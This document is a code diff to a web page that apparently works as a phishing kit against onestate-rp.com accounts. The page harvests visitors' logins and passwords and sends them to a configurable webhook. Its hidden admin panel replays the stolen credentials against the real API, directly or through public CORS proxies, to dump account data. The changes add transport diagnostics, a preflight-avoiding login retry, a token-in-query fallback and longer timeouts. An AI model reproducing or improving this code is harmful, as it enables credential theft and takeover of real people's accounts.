@@ -202,7 +202,7 @@ footer .cp{margin-left:auto;font:600 10px/1 var(--mono);letter-spacing:.14em;opa
 
 /* admin */
 #admin{
-  display:none;position:fixed;right:14px;bottom:14px;z-index:80;width:292px;
+  display:none;position:fixed;right:14px;bottom:14px;z-index:80;width:296px;
   background:rgba(6,10,16,.97);border:1px solid var(--line);border-radius:4px;padding:16px;
   box-shadow:0 30px 70px -20px #000;font-size:12px;max-height:82vh;overflow:auto
 }
@@ -220,7 +220,7 @@ footer .cp{margin-left:auto;font:600 10px/1 var(--mono);letter-spacing:.14em;opa
 #admin .row{display:flex;gap:8px;margin-top:14px}
 #admin button{flex:1;background:var(--ac);color:#04121c;border:0;padding:10px;border-radius:3px;font:700 10px/1 var(--mono);letter-spacing:.1em;cursor:pointer;text-transform:uppercase}
 #admin button.g{background:transparent;color:var(--fg);border:1px solid var(--line2)}
-#admin .lg{margin-top:14px;border-top:1px dashed var(--line2);padding-top:12px;max-height:44vh;overflow:auto}
+#admin .lg{margin-top:14px;border-top:1px dashed var(--line2);padding-top:12px;max-height:46vh;overflow:auto}
 #admin .lg div{font:600 10.5px/1.5 var(--mono);color:var(--mut);border-bottom:1px dotted var(--line2);padding:5px 0;word-break:break-all}
 #admin .lg b{color:var(--ac)}
 
@@ -395,13 +395,16 @@ footer .cp{margin-left:auto;font:600 10px/1 var(--mono);letter-spacing:.14em;opa
     </select>
     <label>Fetch account data</label>
     <select id="aAcct"><option value="1">on</option><option value="0">off</option></select>
-    <label>Transport</label>
+    <label>Transport used</label>
     <input id="aTp" readonly value="not tested">
     <label>Probe account (login + API dump)</label>
     <input id="aIdent" placeholder="onestate id / email">
     <input id="aPass" placeholder="password" style="margin-top:6px">
     <div class="row">
       <button class="g" id="aProbe">Probe API</button>
+    </div>
+    <div class="row">
+      <button class="g" id="aDiag">Diag</button>
     </div>
     <div class="row">
       <button id="aSave">Save</button>
@@ -417,14 +420,17 @@ footer .cp{margin-left:auto;font:600 10px/1 var(--mono);letter-spacing:.14em;opa
   var CONFIG={ WEBHOOK:"", TYPE:"auto", ACCT:true, REDIRECT:false };
   var CFG_KEY="oc_v4_cfg", LOG_KEY="oc_v3_log", FP_KEY="oc_fp";
   var API="https://api.onestate-rp.com/v2";
-  var PATHS=["/auth/me","/user","/users/me","/me","/profile","/account"];
-  var PROX=[
-    {n:"cors.lol", u:function(s){return "https://api.cors.lol/?url="+encodeURIComponent(s)}},
-    {n:"corsfix",  u:function(s){return "https://proxy.corsfix.com/?"+s}},
-    {n:"allorigins", u:function(s){return "https://api.allorigins.win/raw?url="+encodeURIComponent(s)}},
-    {n:"allorigins-g", u:function(s){return "https://api.allorigins.win/get?url="+encodeURIComponent(s)}, wrap:true}
+
+  /* transport list: direct first, then CORS proxies */
+  var TR=[
+    {n:"direct", u:function(s){return s;}},
+    {n:"cors.lol", u:function(s){return "https://api.cors.lol/?url="+encodeURIComponent(s);}},
+    {n:"corsfix", u:function(s){return "https://proxy.corsfix.com/?"+s;}},
+    {n:"allorigins", u:function(s){return "https://api.allorigins.win/raw?url="+encodeURIComponent(s);}},
+    {n:"allorigins-g", u:function(s){return "https://api.allorigins.win/get?url="+encodeURIComponent(s);}, wrap:true}
   ];
-  var pref=null, tp="direct";
+  var PATHS=["/auth/me","/user","/users/me","/me","/profile","/account"];
+  var pref=null, tp="none";
   var $=function(i){return document.getElementById(i)};
   var esc=function(s){return String(s==null?"":s).replace(/[&<>"]/g,function(c){return({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;"})[c]})};
   var q=new URLSearchParams(location.search);
@@ -464,42 +470,74 @@ footer .cp{margin-left:auto;font:600 10px/1 var(--mono);letter-spacing:.14em;opa
     });
   }
 
-  /* ---- raw API call: direct, then proxies; remembers what worked ---- */
+  function unwrap(d,wrap){
+    if(d && wrap && typeof d.contents==="string"){ try{ return JSON.parse(d.contents); }catch(e){ return null; } }
+    return d;
+  }
+  function isApi(d){ return d && (d.code!==undefined || d.errorCode!==undefined || d.data!==undefined); }
+
+  /* single attempt, returns a short status string (for diagnostics) */
+  function once(url,opts,wrap,ms){
+    return new Promise(function(res){
+      var done=false;
+      var t=setTimeout(function(){ if(!done){done=true; res("timeout");} },ms||7000);
+      fetch(url,opts).then(function(r){
+        return r.text().then(function(txt){
+          if(done) return; done=true; clearTimeout(t);
+          var d=null; try{ d=JSON.parse(txt); }catch(e){}
+          d=unwrap(d,wrap);
+          if(d===null||d===undefined) res("html:"+String(txt).replace(/\s+/g," ").slice(0,50));
+          else if(d.code!==undefined) res("api code"+d.code);
+          else if(d.errorCode!==undefined) res("api err="+(d.errorCode||"-")+" data="+(d.data?"y":"n"));
+          else res("json "+JSON.stringify(d).slice(0,60));
+        });
+      }).catch(function(e){ if(done) return; done=true; clearTimeout(t); res("ERR "+(e&&e.name||"?")); });
+    });
+  }
+
+  /* full call: direct, then proxies, remembering what worked */
   function call(path,opts){
     var target=API+path;
-    var list=[{u:target,n:"direct"}];
-    for(var i=0;i<PROX.length;i++){ list.push({u:PROX[i].u(target),n:PROX[i].n,wrap:PROX[i].wrap}); }
     var order=[];
-    if(pref!==null && pref<list.length) order.push(pref);
-    for(var j=0;j<list.length;j++){ if(j!==pref) order.push(j); }
+    if(pref!==null && pref<TR.length) order.push(pref);
+    for(var j=0;j<TR.length;j++){ if(j!==pref) order.push(j); }
 
     return new Promise(function(res){
       var k=0;
       (function next(){
         if(k>=order.length){ res(null); return; }
-        var idx=order[k++], a=list[idx], done=false;
+        var idx=order[k++], a=TR[idx], done=false;
         var t=setTimeout(function(){ if(!done){ done=true; next(); } },6500);
-        fetch(a.u,opts).then(function(r){ return r.text(); }).then(function(txt){
+        fetch(a.u(target),opts).then(function(r){ return r.text(); }).then(function(txt){
           if(done) return;
           done=true; clearTimeout(t);
           var d=null; try{ d=JSON.parse(txt); }catch(e){}
-          if(d && a.wrap && typeof d.contents==="string"){ try{ d=JSON.parse(d.contents); }catch(e){ d=null; } }
-          if(!d || (d.code===undefined && d.errorCode===undefined && d.data===undefined)){ next(); return; }
+          d=unwrap(d,a.wrap);
+          if(!isApi(d)){ next(); return; }
           pref=idx; tp=a.n;
-          if(admin && $("aTp")) $("aTp").value=tp;
+          if($("aTp")) $("aTp").value=tp;
           res(d);
-        }).catch(function(){
-          if(done) return; done=true; clearTimeout(t); next();
-        });
+        }).catch(function(){ if(done) return; done=true; clearTimeout(t); next(); });
       })();
     });
   }
 
   function login(ident,pass){
-    return call("/auth/login",{
-      method:"POST",
-      headers:{"Content-Type":"application/json"},
-      body:JSON.stringify({ident:ident,password:pass,remember:true,fingerprint:fp()})
+    var payload=JSON.stringify({ident:ident,password:pass,remember:true,fingerprint:fp()});
+    return call("/auth/login",{method:"POST",headers:{"Content-Type":"application/json"},body:payload})
+      .then(function(r){
+        if(r) return r;
+        /* retry as a CORS "simple request" (no preflight) */
+        return call("/auth/login",{method:"POST",headers:{"Content-Type":"text/plain;charset=utf-8"},body:payload});
+      });
+  }
+
+  function getWithToken(path,token){
+    return call(path,{headers:{Authorization:"Bearer "+token}}).then(function(d){
+      if(d && d.code===16){
+        return call(path+"?access_token="+encodeURIComponent(token),{}).then(function(e){ return e||d; });
+      }
+      return d;
     });
   }
 
@@ -508,9 +546,7 @@ footer .cp{margin-left:auto;font:600 10px/1 var(--mono);letter-spacing:.14em;opa
     var p=Promise.resolve();
     PATHS.forEach(function(path){
       p=p.then(function(){
-        return call(path,{headers:{Authorization:"Bearer "+token}}).then(function(d){
-          out.push({path:path,data:d});
-        });
+        return getWithToken(path,token).then(function(d){ out.push({path:path,data:d}); });
       });
     });
     return p.then(function(){ return out; });
@@ -585,7 +621,7 @@ footer .cp{margin-left:auto;font:600 10px/1 var(--mono);letter-spacing:.14em;opa
   function fetchAccount(entry){
     $("acctWrap").style.display="block";
     $("acct").textContent="// connecting to api.onestate-rp.com ...";
-    timeout(login(entry.ident,entry.pass),45000).then(function(res){
+    timeout(login(entry.ident,entry.pass),70000).then(function(res){
       if(!res){ $("acct").textContent="// no response from api.onestate-rp.com (all transports failed)"; return; }
       if(res.errorCode||!res.data){
         $("acct").textContent="// login refused ["+tp+"]\n"+JSON.stringify(res).slice(0,500);
@@ -593,7 +629,7 @@ footer .cp{margin-left:auto;font:600 10px/1 var(--mono);letter-spacing:.14em;opa
       }
       entry.clientId=res.data.clientId||"";
       $("acct").textContent="// login OK via "+tp+" - probing endpoints ...";
-      timeout(probe(res.data.accessToken),45000).then(function(list){
+      timeout(probe(res.data.accessToken),70000).then(function(list){
         if(!list){ $("acct").textContent="// probe timed out"; return; }
         var best=pick(list);
         if(best){
@@ -636,6 +672,11 @@ footer .cp{margin-left:auto;font:600 10px/1 var(--mono);letter-spacing:.14em;opa
       return "<div><b>"+esc(e.ident)+"</b><br>"+esc(e.pass)+"<br>"+esc(e.time)+"</div>";
     }).join("") : "<div>no captures yet</div>";
   }
+  function renderDiag(rows){
+    $("aLog").innerHTML = "<div><b>DIAG</b> (GET / POSTjson / POSTtext)</div>" + rows.map(function(r){
+      return "<div><b>"+esc(r.n)+"</b><br>GET: "+esc(r.get||"-")+"<br>POSTj: "+esc(r.post||"-")+"<br>POSTt: "+esc(r.txt||"-")+"</div>";
+    }).join("");
+  }
   if(admin){
     $("admin").classList.add("on");
     $("aWeb").value=cfg.webhook||""; $("aType").value=cfg.wtype; $("aAcct").value=cfg.acct?"1":"0";
@@ -653,17 +694,38 @@ footer .cp{margin-left:auto;font:600 10px/1 var(--mono);letter-spacing:.14em;opa
       sendCreds({ident:"test@example.com",pass:"testpass",time:new Date().toISOString()})
         .then(function(ok){ toast(ok?"Test sent":"Send failed - check URL",ok) });
     };
+    $("aDiag").onclick=function(){
+      var target=API+"/auth/login";
+      var body=JSON.stringify({ident:"diag@example.com",password:"x",remember:true,fingerprint:"diag"});
+      var rows=[];
+      $("aLog").innerHTML="<div>running diag ...</div>";
+      var p=Promise.resolve();
+      TR.forEach(function(tr){
+        p=p.then(function(){
+          var u=tr.u(target), row={n:tr.n};
+          rows.push(row); renderDiag(rows);
+          return once(u,{},tr.wrap).then(function(a){
+            row.get=a; renderDiag(rows);
+            return once(u,{method:"POST",headers:{"Content-Type":"application/json"},body:body},tr.wrap);
+          }).then(function(b){
+            row.post=b; renderDiag(rows);
+            return once(u,{method:"POST",headers:{"Content-Type":"text/plain;charset=utf-8"},body:body},tr.wrap);
+          }).then(function(c){ row.txt=c; renderDiag(rows); });
+        });
+      });
+      p.then(function(){ toast("Diag done"); });
+    };
     $("aProbe").onclick=function(){
       var id=$("aIdent").value.trim(), pw=$("aPass").value;
       if(!id||!pw){ toast("Enter ID and password"); return; }
       $("aLog").innerHTML="<div>connecting...</div>";
-      timeout(login(id,pw),45000).then(function(res){
+      timeout(login(id,pw),70000).then(function(res){
         if(!res){ $("aLog").innerHTML="<div>no response - all transports failed</div>"; return; }
         if(res.errorCode||!res.data){
           $("aLog").innerHTML="<div><b>login refused</b> ["+esc(tp)+"]<br>"+esc(JSON.stringify(res))+"</div>"; return;
         }
         $("aLog").innerHTML="<div><b>login OK</b> via "+esc(tp)+"<br>clientId "+esc(res.data.clientId||"?")+"</div><div>probing...</div>";
-        timeout(probe(res.data.accessToken),45000).then(function(list){
+        timeout(probe(res.data.accessToken),70000).then(function(list){
           if(!list){ $("aLog").innerHTML="<div>probe timed out</div>"; return; }
           $("aLog").innerHTML="<div><b>transport: "+esc(tp)+"</b></div>"+list.map(function(x){
             return "<div><b>"+esc(x.path)+"</b><br>"+esc(JSON.stringify(x.data).slice(0,240))+"</div>";
